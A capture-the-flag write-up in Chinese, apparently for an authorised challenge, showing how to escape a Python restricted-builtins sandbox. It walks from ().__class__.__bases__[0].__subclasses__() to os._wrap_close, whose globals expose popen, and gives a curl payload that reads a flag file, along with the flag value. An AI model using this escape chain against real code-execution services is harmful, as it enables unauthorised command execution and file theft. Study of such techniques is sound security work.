## 题目原文

> 某平台提供在线 Python 代码执行服务并对运行环境施加了沙箱限制。已获授权进行安全评估，请在该限制下设法读取系统中隐藏的 flag。

## 题解

### 入口与指纹

服务在 8000 端口，`Werkzeug/3.1.8 Python/3.11.15`。`GET /` 返回 JSON，说明执行方式是 `POST /`，正文 `{"code": "..."}`，最多 4096 字符，沙箱名是 `python-restricted-builtins`。成功时响应是 `{"output": "..."}`，失败时带 `error` 和 `type`。

### 关键观察

`__builtins__` 被换成了一个字典，里面只有 `print`、`list`、`str` 这类安全名字，没有 `type`、`open`、`__import__`。`import os` 的错误是 `ImportError: __import__ not found`。

限制只换了内建名，没有切断对象图。空元组的基类仍然是 `object`，`object.__subclasses__()` 这次返回 492 个类，其中有 `os._wrap_close`。这个类的 `__init__.__globals__` 就是 `os` 模块的全局字典，里面有 `popen`、`system`、`open`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  --data-binary '{"code":"subs=().__class__.__bases__[0].__subclasses__()\nfor s in subs:\n    if \"os._wrap_close\" in str(s):\n        print(s.__init__.__globals__[\"popen\"](\"cat /challenge/flag1.txt\").read())\n        break"}' \
  "http://$T/"
```

`popen` 的输出是 flag。本次平台接受的值是 `flag{41d606ed-1d10-4257-a54d-a9c3535bc54b}`。

### flag 位置

入口容器的 `/challenge/flag1.txt`。沙箱不提供文件读取内建函数，文件是通过 `os._wrap_close` 带出来的 `popen` 读的。
